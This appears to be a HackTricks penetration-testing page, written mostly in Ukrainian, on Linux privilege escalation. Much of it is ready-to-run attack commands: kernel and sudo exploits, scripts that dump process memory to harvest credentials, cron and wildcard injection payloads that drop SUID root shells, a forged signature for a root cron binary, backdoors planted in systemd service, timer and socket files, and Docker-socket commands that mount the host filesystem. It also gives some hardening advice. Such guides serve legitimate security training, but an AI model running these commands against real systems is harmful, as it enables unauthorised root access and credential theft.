# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про ОС

Почнемо збирати інформацію про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

Якщо ви **маєте права запису в будь-яку папку всередині змінної `PATH`**, ви можете hijack деякі libraries або binaries:
```bash
echo $PATH
```
### Інформація про змінні середовища

Чи є у змінних середовища цікава інформація, паролі або API-ключі?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію ядра та чи існує exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Тут ви можете знайти хороший список вразливих ядер та деякі вже **compiled exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі версії вразливих ядер з цього сайту, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти шукати kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запустити IN victim, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію kernel у Google**, можливо ваша версія kernel згадується в якомусь kernel exploit і тоді ви будете впевнені, що цей exploit дійсний.

Додаткова техніка експлуатації kernel:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

На основі вразливих версій sudo, які з'являються в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використовуючи цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють неповноважним локальним користувачам підвищити свої привілеї до root через опцію sudo `--chroot`, коли файл `/etc/nsswitch.conf` використовується з директорії, якою керує користувач.

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для експлуатації цієї [вразливості](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском експлойту переконайтеся, що ваша версія `sudo` вразлива і підтримує функцію `chroot`.

Для детальнішої інформації зверніться до оригінального [повідомлення про вразливість](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: перевірка підпису не пройшла

Перегляньте **smasher2 box of HTB** як **приклад** того, як цю vuln можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Більше system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічити можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви перебуваєте всередині docker container, ви можете спробувати вийти з нього:


{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **що змонтовано і що не змонтовано**, де і чому. Якщо щось не змонтовано, ви можете спробувати змонтувати це і перевірити на наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелік корисних бінарних файлів
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **будь-який компілятор**. Це корисно, якщо вам потрібно використати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів і сервісів**. Можливо, встановлена якась стара версія Nagios (наприклад), яку можна експлуатувати для escalating privileges…\
Рекомендується вручну перевірити версії найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ по SSH до машини, ви також можете використовувати **openVAS** для перевірки застарілого та вразливого програмного забезпечення, встановленого на машині.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть багато інформації, яка в більшості випадків буде марною, тому рекомендується використовувати програми типу OpenVAS або подібні, які перевіряють, чи є встановлена версія програмного забезпечення вразливою до відомих exploits_

## Процеси

Погляньте, які саме **процеси** виконуються і перевірте, чи якийсь процес не має **більше привілеїв, ніж повинен** (можливо, tomcat виконується від root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** працюють, ви можете зловживати цим для ескалації привілеїв](electron-cef-chromium-debugger-abuse.md). **Linpeas** визначає їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої права на бінарні файли процесів**, можливо ви зможете перезаписати чиїсь.

### Моніторинг процесів

Ви можете використовувати інструменти, такі як [**pspy**](https://github.com/DominicBreuker/pspy), для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, що виконуються часто або коли виконано певний набір умов.

### Пам'ять процесу

Деякі сервіси на сервері зберігають **credentials in clear text inside the memory**.\
Зазвичай вам знадобляться **root privileges** щоб читати пам'ять процесів, що належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете виявити більше credentials.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, які вам належать**.

> [!WARNING]
> Note that nowadays most machines **не дозволяють ptrace за замовчуванням** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Якщо у вас є доступ до пам'яті сервісу FTP (наприклад), ви можете отримати Heap і шукати в ньому credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу **maps показують, як пам'ять відображається в** віртуальному адресному просторі цього процесу; також вони показують **права доступу для кожного відображеного регіону**. Псевдофайл **mem** **показує саму пам'ять процесу**. З файлу **maps** ми дізнаємося, які **регіони пам'яті доступні для читання** і їхні зміщення. Ми використовуємо цю інформацію, щоб **seek into the mem file and dump all readable regions** to a file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до системної **фізичної** пам'яті, а не до віртуальної пам'яті. Віртуальний адресний простір ядра можна отримати через /dev/kmem.\
Зазвичай, `/dev/mem` доступний лише для читання **root** та групи kmem.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це реалізація для Linux класичного інструмента ProcDump із набору інструментів Sysinternals для Windows. Отримати можна за адресою [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб зняти дамп пам'яті процесу, ви можете використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимогу root і дампнути процес, що належить вам
- Скрипт A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущено:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете зробити dump процесу (див. попередні розділи, щоб знайти різні способи dump пам'яті процесу) і шукати облікові дані всередині пам'яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому вигляді з пам'яті** та з деяких **добре відомих файлів**. Для коректної роботи він вимагає root-привілеїв.

| Функція                                           | Ім'я процесу         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Пошукові регулярні вирази/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron jobs

### Crontab UI (alseambusher) що працює від root – web-based scheduler privesc

Якщо веб‑панель “Crontab UI” (alseambusher/crontab-ui) запущена від root і прив'язана тільки до loopback, ви все одно можете дістатися до неї через SSH local port-forwarding і створити привілейоване завдання для ескалації.

Типовий ланцюжок
- Виявити порт, доступний лише на loopback (наприклад, 127.0.0.1:8000) та Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
- Резервні копії/скрипти з `zip -P <password>`
- systemd unit, що містить `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Створити тунель і увійти:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створити high-priv job та запустити негайно (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Посилення безпеки
- Не запускайте Crontab UI від імені root; обмежте його спеціальним користувачем і мінімальними правами
- Прив'язуйте до localhost і додатково обмежуйте доступ через firewall/VPN; не використовуйте повторно паролі
- Уникайте вбудовування секретів у unit files; використовуйте secret stores або root-only EnvironmentFile
- Увімкніть audit/logging для on-demand job executions



Перевірте, чи є вразливі заплановані задачі. Можливо, ви зможете скористатися скриптом, який виконується від імені root (wildcard vuln? можна змінювати файли, які використовує root? використати symlinks? створити специфічні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Шлях cron

Наприклад, у файлі _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права запису у /home/user_)

Якщо в цьому crontab користувач root намагається виконати якусь команду або скрипт без встановлення PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді можна отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, що використовує скрипт з wildcard (Wildcard Injection)

Якщо скрипт виконується від root і має “**\***” у команді, це можна використати, щоб спричинити непередбачувані дії (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard стоїть перед шляхом типу** _**/some/path/\***_ **, він не вразливий (навіть** _**./\***_ **не є).**

Прочитайте наступну сторінку для інших трюків з wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion та command substitution перед arithmetic evaluation в ((...)), $((...)) і let. Якщо root cron/parser читає untrusted log fields і підставляє їх у arithmetic context, атакувальник може інжектувати command substitution $(...), який виконається як root, коли cron запускається.

- Why it works: У Bash expansions відбуваються в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting і pathname expansion. Тому значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (команда виконується), а залишкове числове `0` використовується для arithmetic, тож скрипт продовжує роботу без помилок.

- Типовий вразливий шаблон:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Добийтеся, щоб текст під контролем атакувальника був записаний у parsed log таким чином, щоб поле, що виглядає як число, містило command substitution і закінчувалося цифрою. Переконайтеся, що ваша команда не пише у stdout (або перенаправте її), щоб arithmetic залишалася валідною.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Якщо ви **можете змінити cron script**, який виконується від root, ви дуже легко можете отримати shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо script, що виконується під root, використовує **directory where you have full access**, можливо, буде корисно видалити цю папку й **create a symlink folder to another one**, яка запускатиме script під вашим контролем.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Користувацькі підписані cron binaries з writable payloads
Blue teams інколи "sign" cron-driven binaries, роблячи dump custom ELF section і виконуючи grep по vendor string перед запуском як root. Якщо цей binary є group-writable (наприклад, `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) і ви можете leak signing material, ви можете підробити секцію та перехопити cron task:

1. Використайте `pspy` для захоплення verification flow. В Era root виконав `objcopy --dump-section .text_sig=text_sig_section.bin monitor` потім `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` і після цього запустив файл.
2. Відтворіть очікуваний сертифікат, використовуючи leaked key/config (з `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Створіть зловмисну заміну (наприклад, drop a SUID bash, додайте ваш SSH key) і вбудуйте сертифікат у `.text_sig`, щоб grep проходив:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Перезапишіть scheduled binary, зберігаючи execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Чекайте наступного cron run; як тільки naive signature check пройде, ваш payload запуститься як root.

### Часті cron jobs

Ви можете моніторити процеси, щоб знайти ті, що виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і escalate privileges.

Наприклад, щоб **monitor every 0.1s during 1 minute**, **sort by less executed commands** та видалити команди, які були виконані найчастіше, ви можете зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно відстежуватиме та перераховуватиме кожен процес, що запускається).

### Невидимі cron jobs

Можна створити cronjob **вставивши символ повернення каретки після коментаря** (без символу нового рядка), і cron job буде працювати. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Служби

### Записувані _.service_ файли

Перевірте, чи можете ви записати будь-який `.service` файл; якщо так, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor** коли служба **запускається**, **перезапускається** або **зупиняється** (можливо доведеться почекати, поки машина не перезавантажиться).\
Наприклад, створіть ваш backdoor всередині `.service` файлу з **`ExecStart=/tmp/script.sh`**

### Записувані бінарні файли сервісів

Майте на увазі, що якщо у вас є **права запису над бінарними файлами, які виконуються службами**, ви можете змінити їх на backdoors, тож коли служби будуть повторно виконані, backdoors будуть виконані.

### systemd PATH - Відносні шляхи

Ви можете побачити PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **write** у будь‑якій із папок цього шляху, можливо, ви зможете **escalate privileges**. Потрібно шукати у файлах конфігурації сервісів **relative paths being used on service configurations**, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **тим самим ім'ям, що й бінарний файл у відносному шляху**, всередині папки PATH systemd, до якої ви маєте права на запис, і коли сервіс буде запрошений виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконано** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти сервіси, але перевірте, чи можете ви використати `sudo -l`).

**Дізнайтеся більше про сервіси за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це systemd unit файли, назва яких закінчується на `**.timer**`, які контролюють файли або події `**.service**`. **Таймери** можуть використовуватися як альтернатива cron, оскільки вони мають вбудовану підтримку календарних часових подій та монотонних часових подій і можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Таймери з правом запису

Якщо ви можете змінити timer, ви можете змусити його виконати деякі існуючі systemd.unit (наприклад `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Юніт, який потрібно активувати, коли спливає цей timer. Аргумент — це ім'я юніта, чий суфікс не є ".timer". Якщо не вказано, це значення за замовчуванням відповідає service, що має те саме ім'я, що й timer unit, окрім суфікса. (Див. вище.) Рекомендується, щоб ім'я юніта, який активується, і ім'я самого timer unit були ідентичними, окрім суфікса.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує бінарний файл, до якого є права на запис**
- Знайти якийсь systemd unit, який **виконує відносний шлях** і над яким ви маєте **права на запис** у **systemd PATH** (щоб видаватися за цей виконуваний файл)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні права root і виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зауважте, що **таймер** **активується** шляхом створення символьного посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) дозволяють **обмін процесів** між тими ж або різними машинами в межах клієнт‑серверної моделі. Вони використовують стандартні Unix дескрипторні файли для міжмашинного зв'язку і налаштовуються через `.socket` файли.

Sockets можна налаштувати за допомогою `.socket` файлів.

**Learn more about sockets with `man systemd.socket`.** Всередині цього файлу можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції відрізняються, але загалом використовуються для **вказівки, де буде прослуховуватись** сокет (шлях до AF_UNIX socket файлу, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання створюється **екземпляр service** і лише сокет цього з'єднання передається йому. Якщо **false**, всі прослуховуючі сокети самі **передаються запущеному service unit**, і лише один service unit створюється для всіх з'єднань. Це значення ігнорується для datagram sockets і FIFOs, де один service unit безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові демони так, щоб вони були сумісні з `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймає один або кілька рядків команд, які **виконуються до** або **після** створення й прив'язки прослуховуючих **sockets**/FIFO відповідно. Перший токен у рядку команди повинен бути абсолютним ім'ям файлу, після якого йдуть аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються до** або **після** закриття та видалення прослуховуючих **sockets**/FIFO відповідно.
- `Service`: Вказує ім'я **service** unit, яке потрібно **активувати** при **вхідному трафіку**. Ця опція дозволена лише для сокетів з Accept=no. За замовчуванням використовується service з тим же ім'ям, що й сокет (суфікс замінюється). У більшості випадків використання цієї опції не є необхідним.

### Writable .socket files

Якщо ви знайдете **записуваний** `.socket` файл, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано перед створенням сокета. Тому, ймовірно, вам **потрібно буде почекати перезавантаження машини.**\
_Зверніть увагу, що система має використовувати цю конфігурацію `.socket` файлу, інакше backdoor не буде виконано_

### Writable sockets

Якщо ви **виявите будь-який записуваний socket** (зараз йдеться про Unix Sockets, а не про конфігураційні `.socket` файли), то **ви можете взаємодіяти** з цим сокетом і, можливо, експлуатувати вразливість.

### Перелічення Unix Sockets
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть існувати деякі **sockets listening for HTTP** requests (_я не говорю про .socket files, а про файли, які виступають як unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо сокет **відповідає на HTTP** запит, то ви можете **спілкуватися** з ним і, можливо, **використати якусь вразливість**.

### Docker сокет, доступний для запису

Docker сокет, який часто знаходиться за адресою `/var/run/docker.sock`, — це критичний файл, який слід захистити. За замовчуванням він доступний для запису користувачеві `root` та членам групи `docker`. Наявність прав запису до цього сокета може призвести до privilege escalation. Нижче наведено роз'яснення того, як це можна зробити, а також альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є права запису до Docker сокета, ви можете escalate privileges, використовуючи наступні команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з root-доступом до файлової системи хоста.

#### **Using Docker API Directly**

Якщо Docker CLI недоступний, Docker socket все ще можна керувати за допомогою Docker API та команд `curl`.

1.  **List Docker Images:** Отримати список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надішліть запит на створення контейнера, який змонтує кореневий каталог системи хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat` для встановлення з'єднання з контейнером, що дозволить виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після встановлення з'єднання через `socat` ви можете виконувати команди безпосередньо в контейнері з root-доступом до файлової системи хоста.

### Others

Зауважте, що якщо у вас є права запису до docker socket через те, що ви **inside the group `docker`**, у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки ви можете зловживати нею для підвищення привілеїв:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки ви можете зловживати нею для підвищення привілеїв:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна **inter-Process Communication (IPC) system**, яка дозволяє додаткам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасних Linux-систем, вона пропонує надійну основу для різних форм комунікації між додатками.

Система універсальна, підтримує базовий IPC, який покращує обмін даними між процесами, нагадуючи **enhanced UNIX domain sockets**. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції компонентів системи. Наприклад, сигнал від Bluetooth daemon про вхідний дзвінок може змусити програвач музики приглушити звук, покращуючи досвід користувача. Додатково D-Bus підтримує систему віддалених об’єктів, що спрощує запити сервісів та виклики методів між додатками, оптимізуючи процеси, які раніше були складними.

